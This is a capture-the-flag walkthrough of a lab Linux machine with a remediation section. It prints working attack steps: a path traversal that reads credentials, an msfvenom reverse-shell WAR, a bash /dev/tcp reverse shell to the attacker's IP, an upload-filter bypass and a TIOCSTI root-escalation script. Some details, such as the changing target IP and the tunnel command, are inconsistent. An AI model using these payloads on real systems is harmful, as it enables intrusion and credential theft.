## Backtrack

Medium-difficulty Linux machine with several web services. An aria2 WebUI on port 8888 is vulnerable to path traversal, which leaks Tomcat credentials. The Tomcat manager deploys a malicious WAR file for a shell as `tomcat`. A sudo rule that runs Ansible playbooks as `wilbur` is abused to run a reverse shell. A port-forwarded internal web app gives access as `orville`, and a root-run background task is hijacked to set the SUID bit on bash.

**Target:** 10.49.182.39 (backtrack)
**Difficulty:** Medium
**Attack Path:** Port scan → aria2 WebUI → Path traversal → Tomcat credentials → WAR deploy → Shell as tomcat → Ansible sudo rule → Shell as wilbur → SSH tunnel → Upload bypass → Shell as orville → Root via hijacked background task

---

### PART 1: RECONNAISSANCE

**Full port scan**

```
nmap -p- 10.49.182.39
```

```
22/tcp    open  ssh            OpenSSH 8.2p1 Ubuntu
6800/tcp  open  unknown
8080/tcp  open  http-proxy     Apache Tomcat 8.5.93
8888/tcp  open  sun-answerbook
```

**Service and version scan**

```
nmap -sV -sC -p 22,6800,8080,8888 10.49.182.39
```

**Key findings:**
- Port 6800 is an aria2 JSON-RPC service, which is a download manager.
- Port 8080 runs Apache Tomcat 8.5.93.
- Port 8888 serves an "Aria2 WebUI" control panel, which is the most useful web target.

---

### PART 2: ARIA2 WEBUI

**Using the download feature**

The aria2 WebUI accepts a URI to download. A Python web server was started to test whether the target fetches files from attacker-controlled hosts:

```
python3 -m http.server 8000
```

The server log shows the target connecting back:

```
10.49.182.39 - - "GET /test.jpg HTTP/1.1" 404 -
```

The connection proves outbound requests work. A PHP payload fetched this way did not run on the site, so the next step was to inspect the application itself.

**Version disclosure**

The WebUI settings page reveals the application version. This version is affected by a path traversal flaw.

---

### PART 3: PATH TRAVERSAL TO TOMCAT CREDENTIALS

**Test the traversal**

The `--path-as-is` flag stops curl from normalizing `../` sequences, so the traversal reaches the server unchanged:

```
curl --path-as-is http://10.49.182.39:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
```

**Output:**

```xml
<tomcat-users>
  <role rolename="manager-script"/>
  <user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"/>
</tomcat-users>
```

**Result:** Credentials for the Tomcat user `tomcat` are exposed.

```
tomcat : OPx52k53D8OkTZpx4fr
```

**Why this matters:** The file is readable through the WebUI's file handling because the path is not restricted to the download directory.

---

### PART 4: TOMCAT MANAGER AND WAR DEPLOYMENT

**Generate a WAR payload**

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.136.156 LPORT=4444 -f war > shell.war
```

**List the deployed applications**

The `manager-script` role allows use of the text interface of the manager:

```
curl -u 'tomcat:OPx52k53D8OkTZpx4fr' http://10.49.182.39:8080/manager/text/list
```

```
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:examples
/host-manager:running:0:host-manager
/manager:running:0:manager
/docs:running:0:docs
```

**Deploy the WAR file**

```
curl -u tomcat:OPx52k53D8OkTZpx4fr --upload-file shell.war \
  "http://10.49.182.39:8080/manager/text/deploy?path=/shell&update=true"
```

```
OK - Deployed application at context path [/shell]
```

**Trigger the shell**

```
curl http://10.49.182.39:8080/shell/
```

**Attacker: start a listener**

```
nc -lvnp 4444
```

**Result:**

```
connect to [192.168.136.156] from (UNKNOWN) [10.49.182.39] 52148
uid=1002(tomcat) gid=1002(tomcat) groups=1002(tomcat)
```

---

### PART 5: SHELL STABILIZATION AND FIRST FLAG

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo && fg
export TERM=xterm-256color
```

**Find flags**

```
find / -type f -name "flag*" 2>/dev/null
```

```
/opt/tomcat/flag1.txt
```

```
cat /opt/tomcat/flag1.txt
[flag 1 value: not recorded in notes]
```

---

### PART 6: SUDO ANSIBLE PLAYBOOK TO WILBUR

**Check sudo rights**

```
sudo -l
```

```
User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
```

The `tomcat` user can run Ansible playbooks as `wilbur`, but only files matching `/opt/test_playbooks/*.yml`.

**Why the glob is weak:** The pattern only checks that the path begins with `/opt/test_playbooks/` and ends in `.yml`. Using `../` in the path escapes that directory, so a playbook stored in `/tmp` can still be run.

**Create the playbook in /tmp**

```yaml
- hosts: localhost
  tasks:
    - name: RShell
      command: bash /tmp/wilbur.sh
```

Save it as `/tmp/priv.yml`.

**Create the reverse shell script**

```
echo '/bin/bash -i >& /dev/tcp/192.168.136.156/4445 0>&1' > /tmp/wilbur.sh
chmod +x /tmp/wilbur.sh
chmod 777 /tmp/priv.yml
```

**Attacker: start a listener**

```
nc -lvnp 4445
```

**Run the playbook through the allowed path**

```
sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/priv.yml
```

**Result:**

```
connect to [192.168.136.156] from (UNKNOWN) [10.49.166.200] 55578
wilbur@Backtrack:/tmp$
```

---

### PART 7: WILBUR'S FILES AND CREDENTIAL HINT

```
cd /home/wilbur
ls
from_orville.txt
cat from_orville.txt
```

The note is from `orville` to `wilbur`. It describes a new image gallery web app running locally and includes login credentials for it:

```
email    : orville@backtrack.thm
password : W34r3B3773r73nP3x3l$
```

A second file, `.just_in_case.txt`, holds a password for wilbur:

```
cat .just_in_case.txt
wilbur : mYe317Tb9qTNrWFND7KF
```

---

### PART 8: SSH TUNNEL TO THE INTERNAL WEB APP

**Find the internal service**

```
ss -tulnp
```

```
tcp   LISTEN  0  511  127.0.0.1:80  0.0.0.0:*
```

Port 80 is listening only on localhost, so it cannot be reached directly from outside.

**Forward the port to the attacker machine**

From the attacker machine:

```
ssh -L 9999:127.0.0.1:80 kali@192.168.136.156
```

The local port 9999 on the attacker now connects to the target's localhost port 80.

**Access the gallery app**

```
http://127.0.0.1:9999/
```

Log in with Orville's credentials from the note.

---

### PART 9: UPLOAD FILTER BYPASS TO ORVILLE

**The upload filter**

The gallery restricts file uploads by extension. A double-encoded traversal name is used to slip a PHP file past the check:

```
%252e%252e%252fshell.png.php
```

The filter decodes the name once and sees a harmless `.png` ending, while the server later decodes it again and writes the file with the `.php` extension in a web-accessible directory.

**Upload a PHP reverse shell with this name, then trigger it.**

**Attacker: start a listener**

```
nc -lvnp 5555
```

**Result:**

```
connect to [192.168.136.156] from (UNKNOWN) [10.49.166.200] 38788
uid=1003(orville) gid=1003(orville) groups=1003(orville)
```

**Files**

```
cd /home/orville
ls
flag2.txt  web_snapshot.zip
cat flag2.txt
[flag 2 value: not recorded in notes]
```

---

### PART 10: HIJACKING A ROOT BACKGROUND TASK

**Discover the task**

`pspy64` monitors processes without requiring root. It showed a backend task that repeatedly runs and spawns many screen sessions. The task runs as root and interacts with the terminal of the user who owns the session.

**Why this works:** The `TIOCSTI` ioctl injects characters into a terminal's input queue. A script running as root can therefore type commands into the terminal of another user's session.

**Create the injection script**

Save as `/dev/shm/backtoroot.py`:

```python
#!/usr/bin/env python3
import fcntl
import termios
import os
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in 'chmod +s /bin/bash\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```

The script stops its parent process, then types `chmod +s /bin/bash` into the terminal.

**Persist via .bashrc**

```
echo 'python3 /dev/shm/backtoroot.py' >> ~/.bashrc
```

When the next session starts, the script runs and sets the SUID bit on bash.

**Use the SUID bash**

```
orville@Backtrack:/home/orville$ bash -p
bash-5.0# id
uid=1003(orville) gid=1003(orville) euid=0(root) egid=0(root) groups=0(root),1003(orville)
```

The `-p` flag stops bash from dropping its effective UID, so the shell keeps root rights.

**Root flag**

```
cat /root/flag3.txt
[flag 3 value: not recorded in notes]
```

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port scan (22, 6800, 8080, 8888)
  └─ Identify aria2 WebUI and Tomcat

PHASE 2: WebUI Exploration
  ├─ Test outbound download with python http.server
  └─ Identify version and path traversal

PHASE 3: Credential Disclosure
  ├─ Read /opt/tomcat/conf/tomcat-users.xml via traversal
  └─ tomcat credentials

PHASE 4: Tomcat Shell
  ├─ Build WAR with msfvenom
  ├─ Deploy to /shell via manager text API
  └─ Shell as tomcat, first flag

PHASE 5: Sudo Ansible to Wilbur
  ├─ sudo -l: ansible-playbook as wilbur
  ├─ Playbook in /tmp reached via ../ traversal
  └─ Shell as wilbur

PHASE 6: Internal Access
  ├─ Read from_orville.txt for app credentials
  ├─ Read .just_in_case.txt for wilbur password
  ├─ SSH local port forward to 127.0.0.1:80
  └─ Log in to gallery app

PHASE 7: Upload Bypass to Orville
  ├─ Double-encoded traversal in filename
  └─ Shell as orville, second flag

PHASE 8: Root
  ├─ pspy64 reveals root task
  ├─ TIOCSTI injection via .bashrc
  ├─ SUID bash created
  └─ bash -p as root
```

---

### VULNERABILITIES

1. **Path Traversal in aria2 WebUI (Critical)**
   - File paths not restricted to the intended directory
   - Exposes Tomcat configuration and credentials

2. **Tomcat Manager Exposed with Credentials in Plaintext (High)**
   - Credentials stored in a readable XML file
   - Manager allows deploying arbitrary WAR files

3. **Unsafe Sudo Glob for Ansible Playbooks (High)**
   - Pattern does not stop `../` traversal
   - Allows running attacker-controlled playbooks as wilbur

4. **Plaintext Credentials in User Files (High)**
   - Wilbur's password in `.just_in_case.txt`
   - Orville's app credentials in a note

5. **Weak Upload Validation in Gallery App (High)**
   - Extension check runs before URL decoding
   - Double-encoded traversal bypasses the filter

6. **Root Task Writes to User Terminal via TIOCSTI (Critical)**
   - Root-run process injects input into another user's session
   - Allows arbitrary command execution as root

---

### REMEDIATION

```
├─ Validate and canonicalize file paths in the WebUI; restrict to the download directory
├─ Upgrade aria2 WebUI to a version that fixes the traversal
├─ Do not store Tomcat credentials in readable files; restrict the manager application to trusted IPs
├─ Use exact file paths in sudo rules instead of glob patterns; prevent ../ traversal
├─ Remove plaintext passwords from user files
├─ Validate uploads after decoding and use an allow list of extensions
├─ Run background tasks without terminal injection; avoid writing to other users' sessions
├─ Disable TIOCSTI where supported (kernel setting dev.tty.legacy_tiocsti = 0)
└─ Monitor for SUID changes on system binaries such as /bin/bash
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port and service enumeration)
- python3 http.server (outbound request test)
- curl (path traversal and Tomcat manager API)
- msfvenom (WAR payload generation)
- nc (reverse shell listeners)
- ssh (local port forwarding)
- pspy64 (process monitoring without root)

**Key Insight:** A path traversal in the WebUI exposed Tomcat credentials. Each later step depended on a permission boundary that was weaker than it looked: a glob in sudo, a filter that decoded too early, and a root task that wrote into a user's terminal.

**Concepts to Study:**
- Path traversal and canonicalization
- Tomcat manager WAR deployment
- Sudo glob patterns and path traversal
- SSH local port forwarding
- Double encoding in upload filters
- TIOCSTI terminal injection
- SUID bit and bash -p

# Jai Shri Ram
